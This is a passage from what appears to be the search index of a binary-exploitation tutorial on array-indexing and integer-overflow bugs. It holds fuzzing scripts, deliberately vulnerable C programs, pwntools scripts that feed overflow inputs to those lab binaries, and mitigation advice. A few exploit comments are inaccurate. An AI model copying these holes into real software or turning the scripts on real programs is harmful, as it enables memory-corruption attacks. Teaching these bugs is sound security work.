INT_MAX + 1\n            \"-2147483648\",                              # INT_MIN\n            \"-2147483649\",                              # INT_MIN - 1\n        ]\n\n        for test_input in test_inputs:\n            try:\n                p = process([binary_path, test_input])\n                output = p.recvall(timeout=1)\n\n                # Check for crashes\n                if p.returncode != 0:\n                    crashes.append((test_input, p.returncode, output))\n\n                # Check for interesting output\n                if any(keyword in output for keyword in [b'0x', b'admin', b'secret', b'flag']):\n                    interesting_outputs.append((test_input, output))\n\n                p.close()\n\n            except Exception as e:\n                crashes.append((test_input, \"exception\", str(e)))\n\n    print(f\"Fuzzing completed. Found {len(crashes)} crashes and {len(interesting_outputs)} interesting outputs\")\n\n    return crashes, interesting_outputs\n\ndef targeted_bounds_testing(binary_path):\n    \"\"\"Test specific boundary conditions\"\"\"\n\n    test_cases = [\n        # Boundary tests\n        (\"-1\", \"Negative index\"),\n        (\"0\", \"First element\"),\n        (\"9\", \"Last valid element (if array size 10)\"),\n        (\"10\", \"First invalid element\"),\n        (\"11\", \"Beyond bounds\"),\n        (\"100\", \"Far beyond bounds\"),\n\n        # Integer overflow tests\n        (\"4294967295\", \"UINT_MAX\"),\n        (\"18446744073709551615\", \"ULLONG_MAX\"),\n        (\"-2147483648\", \"INT_MIN\"),\n        (\"2147483647\", \"INT_MAX\"),\n\n        # Format string injection in index\n        (\"%x\", \"Hex format specifier\"),\n        (\"%p\", \"Pointer format specifier\"),\n        (\"%n\", \"Write format specifier\"),\n    ]\n\n    results = []\n\n    for test_input, description in test_cases:\n        try:\n            p = process([binary_path, test_input])\n            output = p.recvall(timeout=2)\n\n            results.append({\n                'input': test_input,\n                'description': description,\n                'returncode': p.returncode,\n                'output': output,\n                'crashed': p.returncode != 0\n            })\n\n            p.close()\n\n        except Exception as e:\n            results.append({\n                'input': test_input,\n                'description': description,\n                'error': str(e),\n                'crashed': True\n            })\n\n    # Print results\n    for result in results:\n        status = \"CRASH\" if result.get('crashed') else \"OK\"\n        print(f\"[{status}] {result['description']} ('{result['input']}')\")\n\n        if 'output' in result and result['output']:\n            print(f\"  Output: {result['output'][:100]}...\")\n\n    return results\n\n# Example usage\n# crashes, interesting = fuzz_array_indexing('./vuln_array')\n# results = targeted_bounds_testing('./vuln_array')\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#memory-layout-analysis","title":"Memory Layout Analysis","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef analyze_memory_layout(binary_path):\n    \"\"\"Analyze memory layout to understand array placement\"\"\"\n\n    # Use GDB to analyze memory layout\n    gdb_script = '''\nset disassembly-flavor intel\nbreak main\nrun\ninfo variables\nx/20wx &amp;data\nx/20wx &amp;secret\nprint &amp;data - &amp;secret\n'''\n\n    print(\"GDB script for memory layout analysis:\")\n    print(gdb_script)\n\n    # Automated analysis using array probing\n    memory_map = {}\n\n    for index in range(-50, 50):\n        try:\n            p = process([binary_path, str(index)])\n            output = p.recvall(timeout=1)\n\n            if b'data[' in output and b'= ' in output:\n                value_str = output.split(b'= ')[1].strip().decode()\n                try:\n                    value = int(value_str)\n                    memory_map[index] = value\n                except:\n                    memory_map[index] = value_str\n\n            p.close()\n\n        except:\n            continue\n\n    # Analyze patterns\n    print(\"Memory layout analysis:\")\n    for index in sorted(memory_map.keys()):\n        value = memory_map[index]\n\n        if isinstance(value, int):\n            if value == 0xdeadbeef:\n                print(f\"Index {index:3d}: 0x{value:08x} (FOUND SECRET!)\")\n            elif value &gt; 0x1000:\n                print(f\"Index {index:3d}: 0x{value:08x} (possible pointer)\")\n            else:\n                print(f\"Index {index:3d}: {value}\")\n        else:\n            print(f\"Index {index:3d}: {value}\")\n\ndef calculate_offset_to_target(binary_path, target_pattern=0xdeadbeef):\n    \"\"\"Calculate offset from array to target variable\"\"\"\n\n    for index in range(-100, 100):\n        try:\n            p = process([binary_path, str(index)])\n            output = p.recvall(timeout=1)\n\n            if b'data[' in output and b'= ' in output:\n                value_str = output.split(b'= ')[1].strip().decode()\n                try:\n                    value = int(value_str)\n                    if value == target_pattern:\n                        print(f\"Target found at index {index}\")\n                        return index\n                except:\n                    pass\n\n            p.close()\n\n        except:\n            continue\n\n    print(\"Target not found\")\n    return None\n\n# Example usage\n# analyze_memory_layout('./vuln_array')\n# offset = calculate_offset_to_target('./vuln_array')\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#mitigation-and-prevention","title":"Mitigation and Prevention","text":""},{"location":"binary-exploitation/memory/02-array-indexing/#secure-coding-practices","title":"Secure Coding Practices","text":"<pre><code>// secure_array.c - Safe array access patterns\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define ARRAY_SIZE 10\n\n// Method 1: Explicit bounds checking\nbool safe_get_element(int *array, size_t array_size, size_t index, int *result) {\n    if (index &gt;= array_size) {\n        printf(\"Error: Index %zu out of bounds (size: %zu)\\n\", index, array_size);\n        return false;\n    }\n\n    *result = array[index];\n    return true;\n}\n\n// Method 2: Clamping indices\nsize_t clamp_index(size_t index, size_t array_size) {\n    if (index &gt;= array_size) {\n        return array_size - 1;  // Clamp to last valid index\n    }\n    return index;\n}\n\n// Method 3: Using safer data structures\ntypedef struct {\n    int *data;\n    size_t size;\n    size_t capacity;\n} safe_array;\n\nsafe_array* create_safe_array(size_t capacity) {\n    safe_array *arr = malloc(sizeof(safe_array));\n    if (!arr) return NULL;\n\n    arr-&gt;data = calloc(capacity, sizeof(int));\n    if (!arr-&gt;data) {\n        free(arr);\n        return NULL;\n    }\n\n    arr-&gt;size = 0;\n    arr-&gt;capacity = capacity;\n    return arr;\n}\n\nbool safe_array_get(safe_array *arr, size_t index, int *result) {\n    if (!arr || !result) return false;\n\n    if (index &gt;= arr-&gt;size) {\n        printf(\"Error: Index %zu out of bounds (size: %zu)\\n\", index, arr-&gt;size);\n        return false;\n    }\n\n    *result = arr-&gt;data[index];\n    return true;\n}\n\nbool safe_array_set(safe_array *arr, size_t index, int value) {\n    if (!arr) return false;\n\n    if (index &gt;= arr-&gt;capacity) {\n        printf(\"Error: Index %zu out of bounds (capacity: %zu)\\n\", index, arr-&gt;capacity);\n        return false;\n    }\n\n    arr-&gt;data[index] = value;\n    if (index &gt;= arr-&gt;size) {\n        arr-&gt;size = index + 1;  // Extend logical size\n    }\n\n    return true;\n}\n\n// Method 4: Input validation\nbool validate_user_index(const char *input, size_t array_size, size_t *result) {\n    char *endptr;\n    long val = strtol(input, &amp;endptr, 10);\n\n    // Check for conversion errors\n    if (endptr == input || *endptr != '\\0') {\n        printf(\"Error: Invalid number format\\n\");\n        return false;\n    }\n\n    // Check for negative values\n    if (val &lt; 0) {\n        printf(\"Error: Negative index not allowed\\n\");\n        return false;\n    }\n\n    // Check bounds\n    if ((size_t)val &gt;= array_size) {\n        printf(\"Error: Index %ld out of bounds (max: %zu)\\n\", val, array_size - 1);\n        return false;\n    }\n\n    *result = (size_t)val;\n    return true;\n}\n\nint main() {\n    int data[ARRAY_SIZE] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n\n    // Safe usage example\n    printf(\"Enter index (0-%d): \", ARRAY_SIZE - 1);\n\n    char input[32];\n    if (fgets(input, sizeof(input), stdin)) {\n        size_t index;\n        if (validate_user_index(input, ARRAY_SIZE, &amp;index)) {\n            int value;\n            if (safe_get_element(data, ARRAY_SIZE, index, &amp;value)) {\n                printf(\"data[%zu] = %d\\n\", index, value);\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#compiler-based-protections","title":"Compiler-Based Protections","text":"<pre><code># Enable array bounds checking (GCC)\ngcc -fbounds-check -o safe_program program.c\n\n# Enable AddressSanitizer for runtime detection\ngcc -fsanitize=address -g -o asan_program program.c\n\n# Enable stack protector\ngcc -fstack-protector-strong -o protected_program program.c\n\n# Enable all warnings\ngcc -Wall -Wextra -Warray-bounds -o warned_program program.c\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#runtime-detection","title":"Runtime Detection","text":"<pre><code>// runtime_checks.c - Runtime bounds checking\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;signal.h&gt;\n\n// Custom bounds checking\n#define SAFE_ARRAY_ACCESS(arr, size, index) \\\n    (((index) &lt; (size)) ? (arr)[index] : \\\n     (printf(\"Bounds violation: index %d &gt;= size %zu\\n\", (index), (size)), \\\n      abort(), 0))\n\n// Signal handler for segmentation faults\nvoid segfault_handler(int sig) {\n    printf(\"Segmentation fault detected - possible bounds violation\\n\");\n    abort();\n}\n\nint main() {\n    // Install signal handler\n    signal(SIGSEGV, segfault_handler);\n\n    int data[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n\n    // Safe access\n    int index = 5;\n    int value = SAFE_ARRAY_ACCESS(data, 10, index);\n    printf(\"data[%d] = %d\\n\", index, value);\n\n    // This would trigger bounds checking\n    // int bad_value = SAFE_ARRAY_ACCESS(data, 10, 15);\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/02-array-indexing/#key-takeaways","title":"Key Takeaways","text":"<p>Array Indexing Fundamentals</p> <ul> <li>Bounds checking is essential - Always validate array indices</li> <li>Negative indices are dangerous - Check for both positive and negative bounds</li> <li>Adjacent variables can be corrupted - Out-of-bounds writes affect nearby memory</li> <li>Integer wraparound creates vulnerabilities - Large unsigned values can become negative</li> <li>Stack and heap layout matters - Understanding memory layout helps exploitation</li> </ul> <p>Common Mistakes</p> <ul> <li>Only checking upper bounds, ignoring negative indices</li> <li>Using signed integers for array sizes without validation</li> <li>Trusting user input for array indices</li> <li>Off-by-one errors in bounds checking (using &lt;= instead of &lt;)</li> <li>Not considering integer overflow in index calculations</li> </ul> <p>Secure Development Tips</p> <ul> <li>Always validate array indices before use</li> <li>Use size_t for array indices and sizes</li> <li>Implement bounds checking functions or use safe array libraries</li> <li>Enable compiler warnings and static analysis tools</li> <li>Use AddressSanitizer during development and testing</li> </ul> <p>Next: Integer Overflow Vulnerabilities</p>"},{"location":"binary-exploitation/memory/03-integer-overflow/","title":"Integer Overflow Vulnerabilities","text":"<p>Integer overflow vulnerabilities occur when arithmetic operations produce results that exceed the maximum value that can be stored in the integer type. These can lead to unexpected behavior, memory corruption, and security bypasses.</p>"},{"location":"binary-exploitation/memory/03-integer-overflow/#understanding-integer-overflows","title":"Understanding Integer Overflows","text":""},{"location":"binary-exploitation/memory/03-integer-overflow/#integer-types-and-ranges","title":"Integer Types and Ranges","text":"<pre><code>Integer Type Ranges (typical 64-bit system):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Type                \u2502 Minimum Value       \u2502 Maximum Value       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 char                \u2502 -128                \u2502 127                 \u2502\n\u2502 unsigned char       \u2502 0                   \u2502 255                 \u2502\n\u2502 short               \u2502 -32,768             \u2502 32,767              \u2502\n\u2502 unsigned short      \u2502 0                   \u2502 65,535              \u2502\n\u2502 int                 \u2502 -2,147,483,648      \u2502 2,147,483,647       \u2502\n\u2502 unsigned int        \u2502 0                   \u2502 4,294,967,295       \u2502\n\u2502 long long           \u2502 -9,223,372,036,854,775,808 \u2502 9,223,372,036,854,775,807 \u2502\n\u2502 size_t              \u2502 0                   \u2502 18,446,744,073,709,551,615 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#types-of-integer-overflows","title":"Types of Integer Overflows","text":"<ol> <li>Arithmetic overflow - Addition, multiplication exceeding limits</li> <li>Wraparound - Values wrapping from max to min or vice versa</li> <li>Underflow - Unsigned values wrapping to maximum</li> <li>Sign extension issues - Mixing signed and unsigned types</li> <li>Truncation - Casting larger types to smaller types</li> </ol>"},{"location":"binary-exploitation/memory/03-integer-overflow/#vulnerable-code-examples","title":"Vulnerable Code Examples","text":""},{"location":"binary-exploitation/memory/03-integer-overflow/#basic-integer-overflow","title":"Basic Integer Overflow","text":"<pre><code>// vuln_overflow.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_malloc(unsigned int size) {\n    printf(\"Allocating buffer of size: %u\\n\", size);\n\n    // VULNERABLE: size can overflow in arithmetic\n    char *buffer = malloc(size + 1);  // +1 for null terminator\n\n    if (!buffer) {\n        printf(\"Allocation failed\\n\");\n        return;\n    }\n\n    printf(\"Buffer allocated at: %p\\n\", buffer);\n\n    // Fill buffer with 'A's\n    memset(buffer, 'A', size);\n    buffer[size] = '\\0';\n\n    printf(\"Buffer filled\\n\");\n    free(buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s &lt;size&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    unsigned int size = (unsigned int)atoi(argv[1]);\n    vulnerable_malloc(size);\n\n    return 0;\n}\n</code></pre> <p>Test: <pre><code>gcc -o vuln_overflow vuln_overflow.c\n./vuln_overflow 100        # Normal case\n./vuln_overflow 4294967295 # UINT_MAX - causes overflow in size + 1\n</code></pre></p>"},{"location":"binary-exploitation/memory/03-integer-overflow/#array-allocation-overflow","title":"Array Allocation Overflow","text":"<pre><code>// vuln_array_alloc.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct {\n    int *data;\n    size_t count;\n} int_array;\n\nint_array* create_array(size_t count) {\n    printf(\"Creating array with %zu elements\\n\", count);\n\n    int_array *arr = malloc(sizeof(int_array));\n    if (!arr) return NULL;\n\n    // VULNERABLE: count * sizeof(int) can overflow\n    arr-&gt;data = malloc(count * sizeof(int));\n\n    if (!arr-&gt;data) {\n        free(arr);\n        return NULL;\n    }\n\n    arr-&gt;count = count;\n    return arr;\n}\n\nvoid fill_array(int_array *arr, int value) {\n    printf(\"Filling array with value %d\\n\", value);\n\n    // This loop might access beyond allocated memory\n    for (size_t i = 0; i &lt; arr-&gt;count; i++) {\n        arr-&gt;data[i] = value;\n    }\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        printf(\"Usage: %s &lt;count&gt; &lt;value&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    size_t count = (size_t)atoll(argv[1]);\n    int value = atoi(argv[2]);\n\n    int_array *arr = create_array(count);\n    if (arr) {\n        fill_array(arr, value);\n        printf(\"Array operations completed\\n\");\n        free(arr-&gt;data);\n        free(arr);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#length-validation-bypass","title":"Length Validation Bypass","text":"<pre><code>// vuln_length.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_SIZE 1024\n\nvoid process_data(char *data, unsigned int length) {\n    // Length validation\n    if (length &gt; MAX_SIZE) {\n        printf(\"Data too long: %u &gt; %u\\n\", length, MAX_SIZE);\n        return;\n    }\n\n    printf(\"Processing data of length: %u\\n\", length);\n\n    // VULNERABLE: length - 1 can underflow\n    char *buffer = malloc(length - 1);\n\n    if (!buffer) {\n        printf(\"Allocation failed\\n\");\n        return;\n    }\n\n    // Copy data (potential heap overflow)\n    memcpy(buffer, data, length);\n\n    printf(\"Data processed\\n\");\n    free(buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s &lt;data&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    char *data = argv[1];\n    unsigned int length = strlen(data);\n\n    process_data(data, length);\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#sign-extension-vulnerability","title":"Sign Extension Vulnerability","text":"<pre><code>// vuln_sign.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid copy_data(char *src, int src_len) {\n    // Check for reasonable length\n    if (src_len &lt; 0 || src_len &gt; 1000) {\n        printf(\"Invalid length: %d\\n\", src_len);\n        return;\n    }\n\n    printf(\"Copying %d bytes\\n\", src_len);\n\n    // VULNERABLE: sign extension when casting to size_t\n    char *dest = malloc(src_len);\n    if (!dest) {\n        printf(\"Allocation failed\\n\");\n        return;\n    }\n\n    // memcpy expects size_t (unsigned), but src_len is signed\n    memcpy(dest, src, src_len);\n\n    printf(\"Copy completed\\n\");\n    free(dest);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        printf(\"Usage: %s &lt;data&gt; &lt;length&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    char *data = argv[1];\n    int length = atoi(argv[2]);\n\n    copy_data(data, length);\n\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"binary-exploitation/memory/03-integer-overflow/#heap-overflow-via-integer-overflow","title":"Heap Overflow via Integer Overflow","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef exploit_malloc_overflow():\n    \"\"\"Exploit malloc size calculation overflow\"\"\"\n\n    # When size + 1 overflows, malloc allocates small buffer\n    # but memset writes large amount\n\n    # UINT_MAX = 4294967295\n    # UINT_MAX + 1 = 0 (overflow)\n    # malloc(0) might return small buffer or NULL\n\n    overflow_size = 0xffffffff  # UINT_MAX\n\n    p = process(['./vuln_overflow', str(overflow_size)])\n\n    output = p.recvall()\n    print(\"Overflow attempt output:\")\n    print(output.decode())\n\n    # Check if program crashed\n    if p.returncode != 0:\n        print(\"Program crashed - potential overflow exploitation\")\n\n    p.close()\n\ndef exploit_array_allocation():\n    \"\"\"Exploit array allocation overflow\"\"\"\n\n    # Find count where count * sizeof(int) overflows\n    # sizeof(int) = 4 on most systems\n    # We want count * 4 to overflow back to small value\n\n    # 2^64 / 4 = 2^62\n    # Values around this will cause overflow\n\n    overflow_count = 0x4000000000000000  # Large value that overflows\n\n    p = process(['./vuln_array_alloc', str(overflow_count), '42'])\n\n    output = p.recvall(timeout=5)\n    print(\"Array allocation overflow:\")\n    print(output.decode())\n\n    p.close()\n\ndef exploit_length_underflow():\n    \"\"\"Exploit length - 1 underflow\"\"\"\n\n    # When length = 0, length - 1 underflows to UINT_MAX\n    # malloc(UINT_MAX) likely fails, but if it succeeds,\n    # memcpy will copy 0 bytes but think buffer is huge\n\n    # Send empty string (length = 0)\n    p = process(['./vuln_length', ''])\n\n    output = p.recvall()\n    print(\"Length underflow attempt:\")\n    print(output.decode())\n\n    p.close()\n\ndef exploit_sign_extension():\n    \"\"\"Exploit sign extension vulnerability\"\"\"\n\n    # Use large positive value that becomes negative when cast to int\n    # 0x80000000 = 2147483648 as unsigned = -2147483648 as signed\n\n    large_value = 0x80000000\n\n    # This might pass the check (large_value as int is negative)\n    # but memcpy sees it as large positive value\n\n    data = b'A' * 100\n\n    p = process(['./vuln_sign', data.decode(), str(large_value)])\n\n    output = p.recvall()\n    print(\"Sign extension exploit:\")\n    print(output.decode())\n\n    p.close()\n\nexploit_malloc_overflow()\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#bypassing-size-checks","title":"Bypassing Size Checks","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef bypass_size_validation():\n    \"\"\"Bypass size validation using integer overflow\"\"\"\n\n    size_check_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_BUFFER_SIZE 1024\n\nvoid process_input(unsigned int size1, unsigned int size2) {\n    // Validation: individual sizes are reasonable\n    if (size1 &gt; MAX_BUFFER_SIZE || size2 &gt; MAX_BUFFER_SIZE) {\n        printf(\"Size too large\\\\n\");\n        return;\n    }\n\n    // VULNERABLE: size1 + size2 can overflow\n    unsigned int total_size = size1 + size2;\n\n    printf(\"Allocating buffer of size: %u\\\\n\", total_size);\n\n    char *buffer = malloc(total_size);\n    if (!buffer) {\n        printf(\"Allocation failed\\\\n\");\n        return;\n    }\n\n    // Fill first part\n    memset(buffer, 'A', size1);\n\n    // Fill second part  \n    memset(buffer + size1, 'B', size2);\n\n    printf(\"Buffer filled\\\\n\");\n    free(buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) return 1;\n\n    unsigned int size1 = atoi(argv[1]);\n    unsigned int size2 = atoi(argv[2]);\n\n    process_input(size1, size2);\n    return 0;\n}\n'''\n\n    print(\"Size validation bypass concept:\")\n    print(\"size1 = 1000, size2 = 1000 -&gt; total = 2000 (normal)\")\n    print(\"size1 = 0xffffffff, size2 = 2 -&gt; total = 1 (overflow)\")\n\n    # Both individual sizes pass validation\n    # But their sum overflows to small value\n    size1 = 0xffffffff  # UINT_MAX\n    size2 = 2\n\n    print(f\"size1: {size1}\")\n    print(f\"size2: {size2}\")\n    print(f\"sum (with overflow): {(size1 + size2) &amp; 0xffffffff}\")\n\ndef width_overflow_attack():\n    \"\"\"Exploit width calculation overflow\"\"\"\n\n    width_calc_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct {\n    unsigned int width;\n    unsigned int height;\n    unsigned char *pixels;\n} image;\n\nimage* create_image(unsigned int width, unsigned int height) {\n    // Check individual dimensions\n    if (width &gt; 10000 || height &gt; 10000) {\n        printf(\"Dimensions too large\\\\n\");\n        return NULL;\n    }\n\n    // VULNERABLE: width * height can overflow\n    unsigned int pixel_count = width * height;\n\n    printf(\"Creating %ux%u image (%u pixels)\\\\n\", width, height, pixel_count);\n\n    image *img = malloc(sizeof(image));\n    if (!img) return NULL;\n\n    // VULNERABLE: Small allocation due to overflow\n    img-&gt;pixels = malloc(pixel_count);\n    if (!img-&gt;pixels) {\n        free(img);\n        return NULL;\n    }\n\n    img-&gt;width = width;\n    img-&gt;height = height;\n\n    return img;\n}\n\nvoid fill_image(image *img, unsigned char color) {\n    // This loop uses the original dimensions\n    // But buffer was allocated with overflowed size\n    for (unsigned int y = 0; y &lt; img-&gt;height; y++) {\n        for (unsigned int x = 0; x &lt; img-&gt;width; x++) {\n            img-&gt;pixels[y * img-&gt;width + x] = color;\n        }\n    }\n}\n'''\n\n    print(\"Width overflow attack concept:\")\n    print(\"width = 65536, height = 65536\")\n    print(\"width * height = 4294967296 = 0 (overflow)\")\n    print(\"malloc(0) allocates small buffer\")\n    print(\"But fill_image writes 65536 * 65536 pixels\")\n\nbypass_size_validation()\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#memory-corruption-attacks","title":"Memory Corruption Attacks","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef heap_corruption_via_overflow():\n    \"\"\"Corrupt heap metadata using integer overflow\"\"\"\n\n    heap_exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct {\n    unsigned int size;\n    char *data;\n} buffer_struct;\n\nbuffer_struct* create_buffer(unsigned int count, unsigned int item_size) {\n    // Individual checks pass\n    if (count &gt; 1000000 || item_size &gt; 1000) {\n        printf(\"Parameters too large\\\\n\");\n        return NULL;\n    }\n\n    // VULNERABLE: count * item_size overflows\n    unsigned int total_size = count * item_size;\n\n    printf(\"Creating buffer: %u * %u = %u bytes\\\\n\", count, item_size, total_size);\n\n    buffer_struct *buf = malloc(sizeof(buffer_struct));\n    if (!buf) return NULL;\n\n    buf-&gt;data = malloc(total_size);\n    if (!buf-&gt;data) {\n        free(buf);\n        return NULL;\n    }\n\n    buf-&gt;size = count * item_size;  // Store original calculation\n\n    return buf;\n}\n\nvoid write_pattern(buffer_struct *buf, unsigned char pattern) {\n    // Write pattern to entire \"buffer\"\n    // But actual allocated size might be much smaller\n    memset(buf-&gt;data, pattern, buf-&gt;size);\n}\n'''\n\n    print(\"Heap corruption concept:\")\n    print(\"1. Allocate buffer with overflowed size calculation\")\n    print(\"2. Write data based on original size values\")\n    print(\"3. Overwrite adjacent heap chunks\")\n    print(\"4. Corrupt heap metadata\")\n\ndef stack_corruption_via_alloca():\n    \"\"\"Corrupt stack using alloca with overflowed size\"\"\"\n\n    alloca_exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;alloca.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function(unsigned int count, unsigned int size) {\n    // Check individual parameters\n    if (count &gt; 1000 || size &gt; 1000) {\n        printf(\"Parameters too large\\\\n\");\n        return;\n    }\n\n    // VULNERABLE: count * size overflows\n    unsigned int total_size = count * size;\n\n    printf(\"Allocating %u bytes on stack\\\\n\", total_size);\n\n    // alloca on stack with overflowed size\n    char *stack_buffer = alloca(total_size);\n\n    // Write based on original calculation\n    for (unsigned int i = 0; i &lt; count; i++) {\n        memset(stack_buffer + i * size, 'A' + (i % 26), size);\n    }\n\n    printf(\"Stack buffer filled\\\\n\");\n}\n'''\n\n    print(\"Stack corruption concept:\")\n    print(\"1. alloca allocates small buffer due to overflow\")\n    print(\"2. Writing loop uses original values\")\n    print(\"3. Overwrites return address and other stack data\")\n\ndef format_string_with_overflow():\n    \"\"\"Combine integer overflow with format string\"\"\"\n\n    format_overflow_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid log_message(char *format, unsigned int repeat_count) {\n    // Simple validation\n    if (repeat_count &gt; 100) {\n        printf(\"Repeat count too high\\\\n\");\n        return;\n    }\n\n    // VULNERABLE: repeat_count * strlen(format) can overflow\n    unsigned int total_length = repeat_count * strlen(format);\n\n    char *log_buffer = malloc(total_length + 1);\n    if (!log_buffer) return;\n\n    // Build repeated message\n    log_buffer[0] = '\\\\0';\n    for (unsigned int i = 0; i &lt; repeat_count; i++) {\n        strcat(log_buffer, format);  // VULNERABLE: format string\n    }\n\n    // VULNERABLE: User-controlled format string\n    printf(log_buffer);\n\n    free(log_buffer);\n}\n'''\n\n    print(\"Combined integer overflow + format string:\")\n    print(\"1. Overflow in length calculation\")\n    print(\"2. Small buffer allocated\")\n    print(\"3. strcat writes beyond buffer\")\n    print(\"4. Format string vulnerability in printf\")\n\nheap_corruption_via_overflow()\n</code></pre>"},{"location":"binary-exploitation/memory/03-integer-overflow/#advanced-integer-overflow-techniques","title":"Advanced Integer Overflow Techniques","text":""},{"location":"binary-exploitation/memory/03-integer-overflow/#race-conditions-with-toctou","title":"Race Conditions with TOCTOU","text":"<pre><code>#!/usr/bin/env python3\nimport threading\nimport time\n\ndef toctou_integer_overflow():\n    \"\"\"Time-of-check to time-of-use with integer overflow\"\"\"\n\n    toctou_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\n// Global variable that can be modified by another thread\nvolatile unsigned int global_size = 100;\n\nvoid process_data() {\n    // Time of Check: validate size\n    if (global_size &gt; 1000) {\n        printf(\"Size too large: %u\\\\n\", global_size);\n        return;\n    }\n\n    printf(\"Size validated: %u\\\\n\", global_size);\n\n    // Simulate delay (another thread can modify global_size here)\n    usleep(1000);\n\n    // Time of Use: use the size for allocation\n    char *buffer = malloc(global_size);\n    if (!buffer) {\n        printf(\"Allocation failed\\\\n\");\n        return;\n    }\n\n    // Use size again (might be different now)\n    memset(buffer, 'A', global_size);\n\n    printf(\"Buffer filled with size: %u\\\\n\", global_size);\n    free(buffer);\n}\n\nvoid attacker_thread() {\n    // Wait for victim to pass validation\n    usleep(500);\n\n    // Change size to cause overflow\n    global_size = 0xffffffff;  // Very large value\n\n    printf(\"Attacker changed size to: %u\\\\n\", global_size);\n}\n'''\n\n    print(\"TOCTOU integer overflow concept:\")\n    print(\"1. Thread 1 validates global_size (passes check)\")\n    print(\"2. Thread 2 modifies global_size to large value\")\n    print(\"3. Thread 1 uses modified value in allocation/operations\")\n\ndef atomic_operation_bypass():\n    \"\"\"Bypass using non-atomic operations\"\"\"\n\n    atomic_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdatomic.h&gt;\n\natomic_uint shared_counter = 0;\n\nvoid increment_and_allocate() {\n    // Non-atomic read-modify-write\n    unsigned int current = atomic_load(&amp;shared_counter);\n\n    // Validation based on current value\n    if (current &gt; 1000) {\n        printf(\"Counter too high: %u\\\\n\", current);\n        return;\n    